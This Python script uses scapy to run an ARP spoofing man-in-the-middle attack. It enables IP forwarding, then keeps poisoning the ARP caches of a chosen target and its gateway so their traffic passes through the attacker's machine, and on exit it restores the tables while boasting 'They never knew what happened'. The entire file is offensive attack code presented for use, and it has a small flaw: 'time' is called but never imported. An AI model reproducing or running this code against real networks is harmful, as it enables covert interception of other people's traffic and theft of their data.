import scapy.all 
import argparse
import subprocess


def get_argument():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help= 'the target ip')
	parser.add_argument('-g', '--gateway', help= 'the gateway ip')
	args = parser.parse_args()
	return args.target, args.gateway


def get_mac(iprange):
	arp_pkt = scapy.all.ARP(pdst = iprange)
	ether_pkt = scapy.all.Ether(dst = 'ff:ff:ff:ff:ff:ff')
	ether_arp_pkt = ether_pkt/arp_pkt 
	ans_list = scapy.all.srp(ether_arp_pkt, timeout = 1, verbose= False)[0]
	return ans_list[0][1].src
	

def spoof(target_ip, gateway_ip):
	response_pkt = scapy.all.ARP(op= 2, pdst= target_ip, hwdst= get_mac(target_ip),psrc= gateway_ip)
	scapy.all.send(response_pkt, verbose =False)
	
		
def restore( target_ip, gateway_ip):
	arp_pkt = scapy.all.ARP(
		op= 2, 
		hwsrc= get_mac(gateway_ip), 
		psrc= gateway_ip,
		pdst= target_ip,
		hwdst= get_mac(target_ip)
		)
	scapy.all.send(arp_pkt,count= 4, verbose= False)
	


target, gateway = get_argument()
count = 1
char = '.'

print('Setting up port forwarding')
subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward',shell= True)
	
try:

	while True:
	
		spoof(target, gateway)
		if count <=1:	
			print(f'[+] Telling target ({target}) I am gateway ({gateway})')
			time.sleep(1)
		spoof(gateway, target)
		if count <=1:
			print(f'[+] Telling gateway ({gateway}) I am target ({target})')
		else:
			print(f'\r{char*count}', end ='')
		time.sleep(1)
		count += 1

except KeyboardInterrupt:
	
	print('\nRestoring the arp tables in the victems')
	restore(target, gateway)
	restore(gateway, target)	
	print('They never knew what happened')
	
finally:
	print('GoodBye')
